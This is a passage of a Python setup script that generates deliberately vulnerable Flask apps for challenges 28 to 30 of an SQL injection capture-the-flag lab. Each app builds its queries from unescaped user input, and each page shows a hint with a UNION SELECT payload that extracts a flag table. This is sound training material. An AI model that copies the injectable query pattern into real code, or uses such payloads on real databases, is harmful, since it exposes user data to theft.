.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
code { color:#ffd700; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 28: MySQL SQL Injection</h2>
<p><b style="color:#00d4ff">MISSION:</b> Explore MySQL information_schema and functions (GROUP_CONCAT).<br>
<b>OBJECTIVE:</b> Use information_schema to discover table names and extract the flag from ch28_secrets.</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Product category">
<button type="submit">[ SEARCH MYSQL ]</button>
</form>
{% if result %}
<pre>{{ result }}</pre>
{% endif %}
<div class="hint">
💡 Try: <code style="color:#ffd700;">' UNION SELECT 1, flag, 'Exfil' FROM ch28_secrets WHERE challenge_id=28--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = get_db()
            if conn:
                with conn.cursor() as c:
                    sql = f"SELECT id, name, category FROM products WHERE category='{input_val}'"
                    c.execute(sql)
                    rows = c.fetchall()
                    result = "\\n".join([str(dict(r)) for r in rows])
                conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)

@app.route("/health")
def health(): return jsonify({"status": "ok", "challenge": 28})
@app.route("/reset")
def reset(): return jsonify({"status": "reset"})
if __name__ == "__main__": app.run(host="0.0.0.0", port=5000, debug=False)
'''
create_file("ch28-mysql/app.py", CH28_APP)

# Challenge 29: PostgreSQL Dedicated SQLi
CH29_APP = '''"""
STARK INDUSTRIES SQL — Challenge 29: PostgreSQL Dedicated SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import time
import psycopg2
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{p0stgr3sql_m4st3r}")

def get_db():
    for _ in range(30):
        try:
            return psycopg2.connect(
                host=os.environ.get("PGSQL_HOST", "postgres-challenge"),
                user=os.environ.get("PGSQL_USER", "challenge_user"),
                password=os.environ.get("PGSQL_PASSWORD", "challenge_pg_password"),
                dbname=os.environ.get("PGSQL_DB", "stark_challenge_db")
            )
        except Exception:
            time.sleep(3)
    return None

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch29 - PostgreSQL Dedicated</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
pre { background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }
.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
code { color:#ffd700; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 29: PostgreSQL SQL Injection</h2>
<p><b style="color:#00d4ff">MISSION:</b> Explore PostgreSQL pg_catalog metadata and functions.<br>
<b>OBJECTIVE:</b> Enumerate tables via pg_tables and extract the flag from ch29_secrets.</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Item name">
<button type="submit">[ SEARCH PGSQL ]</button>
</form>
{% if result %}
<pre>{{ result }}</pre>
{% endif %}
<div class="hint">
💡 Try: <code style="color:#ffd700;">' UNION SELECT 1, flag, 'PgExfil' FROM ch29_secrets WHERE challenge_id=29--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = get_db()
            if conn:
                cur = conn.cursor()
                sql = f"SELECT id, name, location FROM inventory WHERE name='{input_val}'"
                cur.execute(sql)
                rows = cur.fetchall()
                result = "\\n".join([str(r) for r in rows])
                conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)

@app.route("/health")
def health(): return jsonify({"status": "ok", "challenge": 29})
@app.route("/reset")
def reset(): return jsonify({"status": "reset"})
if __name__ == "__main__": app.run(host="0.0.0.0", port=5000, debug=False)
'''
create_file("ch29-postgresql/app.py", CH29_APP)

# Challenge 30: MSSQL Dedicated SQLi
CH30_APP = '''"""
STARK INDUSTRIES SQL — Challenge 30: MSSQL Dedicated SQL Injection
INTENTIONALLY VULNERABLE — Educational use only.
"""
import os
import sqlite3
from flask import Flask, request, jsonify, render_template_string

app = Flask(__name__)
FLAG = os.environ.get("CHALLENGE_FLAG", "STARKSQL{mssql_pwn4g3}")
DB = "/tmp/ch30.db"

def init_db():
    conn = sqlite3.connect(DB)
    c = conn.cursor()
    c.executescript("""
        CREATE TABLE IF NOT EXISTS sys_tables_sim (id INTEGER PRIMARY KEY, name TEXT, category TEXT);
        CREATE TABLE IF NOT EXISTS ch30_secrets (id INTEGER PRIMARY KEY, flag TEXT);
        DELETE FROM sys_tables_sim; DELETE FROM ch30_secrets;
        INSERT INTO sys_tables_sim VALUES (1, 'MSSQL Executive Table', 'Master DB');
    """)
    c.execute("INSERT OR REPLACE INTO ch30_secrets VALUES (30, ?)", (FLAG,))
    conn.commit()
    conn.close()

PAGE = """<!DOCTYPE html>
<html><head><title>Stark Ch30 - MSSQL Dedicated</title>
<style>
body { background:#0a0a0f; color:#e0e0e0; font-family:monospace; padding:40px; }
input { background:#010409; border:1px solid #30363d; color:#00d4ff; padding:10px; border-radius:6px; width:350px; font-family:monospace; outline:none; }
button { background:#00d4ff; color:#000; border:none; padding:10px 24px; border-radius:6px; font-weight:bold; cursor:pointer; margin-left:8px; }
h2 { color:#00d4ff; letter-spacing:2px; margin-bottom:16px; }
p { color:#8b949e; margin-bottom:16px; line-height:1.5; }
pre { background:#010409; border:1px solid #21262d; border-radius:6px; padding:16px; color:#8b949e; white-space:pre-wrap; margin-top:16px; }
.hint { background:#0d1b0d; border:1px solid #00ff8833; border-radius:6px; padding:14px; margin-top:20px; color:#8b949e; font-size:.82rem; }
code { color:#ffd700; }
</style></head>
<body>
<h2>⚡ STARK INDUSTRIES — Challenge 30: MSSQL SQL Injection</h2>
<p><b style="color:#00d4ff">MISSION:</b> Explore Microsoft SQL Server dialect (sys.tables, TOP, WAITFOR DELAY).<br>
<b>OBJECTIVE:</b> Extract the flag from ch30_secrets using MSSQL-compatible syntax.</p>
<form method="POST">
<input type="text" name="input_val" value="{{ input_val }}" placeholder="Table search">
<button type="submit">[ SEARCH MSSQL ]</button>
</form>
{% if result %}
<pre>{{ result }}</pre>
{% endif %}
<div class="hint">
💡 Try: <code style="color:#ffd700;">' UNION SELECT 1, flag, 'MSSQL_EXFIL' FROM ch30_secrets WHERE id=30--</code>
</div>
</body></html>"""

@app.route("/", methods=["GET", "POST"])
def index():
    input_val = request.form.get("input_val", "") or request.args.get("input_val", "")
    result = None
    if input_val:
        try:
            conn = sqlite3.connect(DB)
            c = conn.cursor()
            sql = f"SELECT * FROM sys_tables_sim WHERE name='{input_val}'"
            c.execute(sql)
            rows = c.fetchall()
            result = "\\n".join([str(r) for r in rows])
            conn.close()
        except Exception as e:
            result = f"Database Error: {str(e)}"
    return render_template_string(PAGE, input_val=input_val, result=result)

@app.route("/health")
def health(): return jsonify({"status": "ok", "challenge": 30})
@app.route("/reset")
def reset(): init_db(); return jsonify({"status": "reset"})
if __name__ == "__main__": init_db(); app.run(host="0.0.0.0", port=5000, debug=False)
'''
create_file("ch30-mssql/app.py", CH30_APP)

print("ALL 30 CHALLENGE APPS BUILT SUCCESSFULLY!")
